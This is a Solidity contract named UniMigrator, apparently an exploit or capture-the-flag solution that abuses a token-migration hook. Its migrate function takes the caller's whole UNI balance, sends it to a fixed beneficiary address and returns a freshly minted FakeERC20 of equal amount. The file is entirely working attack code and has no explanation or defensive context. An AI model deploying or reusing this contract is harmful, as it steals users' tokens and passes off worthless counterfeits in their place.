// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IMigratorDevice.sol";
import "./FakeERC20.sol";

contract UniMigrator is IMigratorDevice
{
	address private immutable _beneficiary;

	constructor(address beneficiaryAddress)
	{
		_beneficiary = beneficiaryAddress;
	}

	function migrate(IERC20 src) override public returns (address)
	{
		require(address(src) == 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984, "UniMigrator: Not uni token");
		uint256 bal = src.balanceOf(msg.sender);
		src.transferFrom(msg.sender, _beneficiary, bal);
		return address(new FakeERC20(bal));
	}

	function beneficiary() override public view returns(address)
	{
		return _beneficiary;
	}
}